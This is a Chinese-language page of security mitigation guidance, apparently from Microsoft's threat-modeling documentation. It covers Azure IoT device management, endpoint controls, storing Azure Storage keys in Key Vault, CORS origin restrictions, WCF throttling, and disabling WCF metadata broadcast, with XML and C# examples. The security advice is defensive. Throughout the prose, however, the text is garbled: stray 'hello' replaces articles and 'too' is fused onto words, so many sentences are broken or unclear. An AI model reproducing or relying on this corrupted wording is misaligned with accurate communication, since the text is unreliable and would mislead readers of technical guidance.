| **步驟** | LWM2M 是從 hello 開放行動聯盟 IoT 裝置管理通訊協定。 Azure IoT 裝置管理入口允許 toointeract 與使用裝置作業的實體裝置。 請確定該 hello 雲端閘道實作處理程序 tooroutinely 保持 hello 裝置和其他組態資料 toodate 使用 Azure IoT 中樞裝置管理設定。 |

## <a id="controls-policies"></a>確保裝置已根據組織的原則設定端點安全性控制項

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | 電腦信任邊界 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 確保裝置有根據組織安全性原則設定的端點安全性控制項，例如適用於磁碟層級加密的 bitlocker、採用更新後簽章的防毒軟體、主機型防火牆、OS 升級、群組原則等。 |

## <a id="secure-keys"></a>確保 Azure 儲存體存取金鑰的安全管理

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Azure 儲存體 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [Azure 儲存體安全性指南 - 管理儲存體帳戶金鑰](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **步驟** | <p>金鑰儲存： 它建議 toostore hello Azure 儲存體存取金鑰做為密碼的 Azure 金鑰保存庫中，且有 hello 擷取 hello 金鑰從金鑰保存庫的應用程式。 這因為 toohello 下列建議的原因：</p><ul><li>hello 應用程式組態檔中，代表要移除的人取得存取 toohello 金鑰沒有特定的權限途徑絕對不會有 hello 儲存體金鑰的硬式編碼</li><li>可以使用 Azure Active Directory 來控制存取 toohello 金鑰。 這表示帳戶擁有者可以授與存取 toohello 少數需要 tooretrieve hello 索引鍵，從 Azure 金鑰保存庫的應用程式。 其他應用程式不會無法 tooaccess hello 機碼，不必授與他們權限特別</li><li>重新產生金鑰： 建議 toohave 處理程序中的位置 tooregenerate Azure 儲存體存取金鑰基於安全性考量。 有關原因和方式 tooplan 重新產生金鑰所述的 hello Azure 儲存體安全性指南 》 參考文件</li></ul>|

## <a id="cors-storage"></a>確保在 Azure 儲存體上啟用 CORS 的情況下只允許信任的來源

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Azure 儲存體 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [Hello Azure 儲存體服務的 CORS 支援](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **步驟** | Azure 儲存體可讓您 tooenable CORS – 跨原始資源共用。 每個儲存體帳戶，您可以指定可存取該儲存體帳戶中的 hello 資源的網域。 根據預設，所有服務上都會停用 CORS。 您可以使用 hello REST API 或 hello 儲存體用戶端程式庫 toocall 其中 hello 方法 tooset hello 服務原則，以啟用 CORS。 |

## <a id="throttling"></a>啟用 WCF 的服務節流功能

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | WCF | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | .NET Framework 3 |
| **屬性**              | N/A  |
| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **步驟** | <p>不在 hello 中放置限制使用的系統資源可能會導致資源耗盡，最後阻絕服務。</p><ul><li>**說明：** Windows Communication Foundation (WCF) 提供 hello 能力 toothrottle 服務要求。 允許太多的用戶端要求可能會淹沒系統及耗盡其資源。 Hello 上另一方面，讓只有少數要求 tooa 服務可讓合法使用者無法使用 hello 服務。 每個服務應該設定的個別微調的 tooand tooallow hello 適當的資源數量。</li><li>**建議** 啟用 WCF 的服務節流功能以及為應用程式設定適當的限制。</li></ul>|

### <a name="example"></a>範例
hello 以下是範例設定以啟用節流設定：
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-透過中繼資料的資訊洩漏

| Title                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | WCF | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | .NET Framework 3 |
| **屬性**              | N/A  |
| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **步驟** | 中繼資料，有助於深入了解 hello 系統，並規劃一種攻擊，攻擊者。 WCF 服務可以設定的 tooexpose 中繼資料。 中繼資料可提供詳細的服務描述資訊，且不得在生產環境中廣播。 hello `HttpGetEnabled`  /  `HttpsGetEnabled` hello ServiceMetaData 類別的屬性定義服務是否會公開 hello 中繼資料 | 

### <a name="example"></a>範例
hello 的下列程式碼會指示 WCF toobroadcast 服務的中繼資料
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
不要在生產環境中廣播服務中繼資料。 設定 hello HttpGetEnabled / hello ServiceMetaData HttpsGetEnabled 屬性類別 toofalse。 

### <a name="example"></a>範例
hello 的下列程式碼會指示 WCF toonot 廣播服務的中繼資料。 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
